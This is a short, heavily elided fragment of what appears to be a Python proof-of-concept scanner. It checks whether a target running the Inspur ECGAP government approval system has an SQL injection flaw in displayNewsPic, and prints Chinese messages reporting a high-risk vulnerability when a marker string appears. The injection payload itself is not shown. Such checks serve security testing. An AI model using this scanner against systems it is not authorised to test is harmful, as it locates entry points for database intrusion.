...
class inspur_ecgap_displayNewsPic_sqli:
    ...
    def run(self):
        ...
        try:
            ...
            if r"GAOJI" in req.text:
                printGreen("[+]Success:存在浪潮ECGAP政务审批系统SQL注入漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在inspur_ecgap_displayNewsPic_sqli漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = inspur_ecgap_displayNewsPic_sqli(sys.argv[1])
    testVuln.run()